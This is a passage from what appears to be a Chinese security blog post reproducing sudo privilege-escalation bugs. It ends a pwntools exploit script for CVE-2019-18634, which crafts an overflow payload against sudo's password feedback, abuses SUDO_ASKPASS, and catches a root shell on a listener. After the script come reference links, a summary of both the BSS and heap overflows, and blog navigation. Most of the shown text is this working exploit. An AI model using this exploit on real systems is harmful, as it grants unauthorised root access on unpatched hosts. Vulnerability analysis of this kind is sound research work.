	<span class="n">os</span><span class="o">.</span><span class="n">chmod</span><span class="p">(</span><span class="n">shell_path</span><span class="p">,</span><span class="mi">0</span><span class="n">o777</span><span class="p">)</span>
	<span class="n">mfd</span><span class="p">,</span> <span class="n">sfd</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">openpty</span><span class="p">()</span>
	<span class="n">fd</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">open</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">ttyname</span><span class="p">(</span><span class="n">sfd</span><span class="p">),</span> <span class="n">os</span><span class="o">.</span><span class="n">O_RDONLY</span><span class="p">)</span>
	
	<span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">([</span><span class="n">TARGET</span><span class="p">,</span><span class="s2">&#34;-S&#34;</span><span class="p">,</span> <span class="s2">&#34;id&#34;</span><span class="p">],</span><span class="n">stdin</span><span class="o">=</span><span class="n">fd</span><span class="p">,</span><span class="n">env</span><span class="o">=</span><span class="p">{</span><span class="s2">&#34;SUDO_ASKPASS&#34;</span><span class="p">:</span><span class="n">shell_path</span><span class="p">})</span>
	<span class="n">port</span> <span class="o">=</span> <span class="n">listen</span><span class="p">(</span><span class="mi">3000</span><span class="p">)</span>
	<span class="n">payload</span>  <span class="o">=</span> <span class="s1">&#39;</span><span class="se">\x00\x15</span><span class="s1">&#39;</span><span class="o">*</span><span class="mh">0xFF</span>  <span class="c1">#buf</span>
	<span class="n">payload</span> <span class="o">+=</span> <span class="s1">&#39;</span><span class="se">\x00\x15</span><span class="s1">&#39;</span><span class="o">*</span><span class="mh">0x20</span> 	<span class="c1">#askpass_link</span>
	<span class="n">payload</span> <span class="o">+=</span> <span class="s1">&#39;</span><span class="se">\x00\x15</span><span class="s1">&#39;</span><span class="o">*</span><span class="mh">0x105</span> <span class="c1">#signo</span>
	<span class="n">payload</span> <span class="o">+=</span>  <span class="n">p64</span><span class="p">(</span><span class="n">setFlags</span><span class="p">(</span><span class="s2">&#34;TGP_STDIN|TGP_ASKPASS&#34;</span><span class="p">))</span>
	<span class="n">payload</span> <span class="o">+=</span> <span class="s1">&#39;</span><span class="se">\x15\x00</span><span class="s1">&#39;</span><span class="o">*</span><span class="mh">0x14</span>  <span class="c1">#tgetpass_flags</span>
	<span class="n">payload</span> <span class="o">+=</span> <span class="s1">&#39;</span><span class="se">\x15\x00</span><span class="s1">&#39;</span><span class="o">*</span><span class="mh">0x30</span>  <span class="c1">#user_details</span>
	<span class="n">payload</span> <span class="o">+=</span> <span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span>
	<span class="n">pause</span><span class="p">()</span>
	<span class="n">os</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">mfd</span><span class="p">,</span><span class="n">payload</span><span class="p">)</span>
	<span class="n">port</span><span class="o">.</span><span class="n">wait_for_connection</span><span class="p">()</span>
	<span class="n">pause</span><span class="p">()</span>
	<span class="n">port</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></td></tr></table>
</div>
</div><h3 id="reference">Reference</h3>
<p><a href="https://xz.aliyun.com/t/7622">[CVE-2019-18634漏洞复现与分析]</a><br>
<a href="https://www.anquanke.com/post/id/198481?from=timeline">[CVE-2019-18634 sudo 提权漏洞分析]</a>
<a href="../attachment/CVE-2019-18634.zip">[CVE-2019-18634附件]</a></p>
<h3 id="总结">总结</h3>
<p>Sudo上述两个漏洞都是缓冲区溢出,一个在BSS段上溢出,溢出修改user_details结构体,导致fork()的子进程为root权限,一个在堆上的溢出,通过控制环境变量,然后覆盖字符串指针从而实现so文件注入运行root权限的shell
◔ ‸◔</p>

    </div>
</div>

<div class="container">
    
    <nav class="flex container suggested">
        
        <a rel="prev" href="/articles/%E9%80%9A%E8%BF%87dasctfhws%E8%B5%9B%E9%A2%98babycall%E6%9D%A5%E6%8E%A2%E7%A9%B6%E7%BB%95%E8%BF%87kpti%E4%BF%9D%E6%8A%A4/" title="Previous post (older)">
            <span>Previous</span>
            通过DASCTF&amp;HWS赛题babycall来探究绕过KPTI保护
            </a>
        
        
        
        <a rel="next" href="/articles/qwb2021-notebook/" title="Next post (newer)">
            <span>Next</span>
            2021年第五届强网杯-NoteBook
            </a> 
        
    </nav>
    
</div>
</main>


        </main>
        <footer class="footer flex">
    <section class="container">
        <nav class="footer-links">
            
            <a href="/index.xml">RSS</a>
            
        </nav>
    </section>
    
    <script async src="/js/features.min.a94f58a30ad2560de728e080d87f75c60cf806fd1b3d5f4815f1a1a02c0d1859.js"></script>
</footer>
    </body>
</html>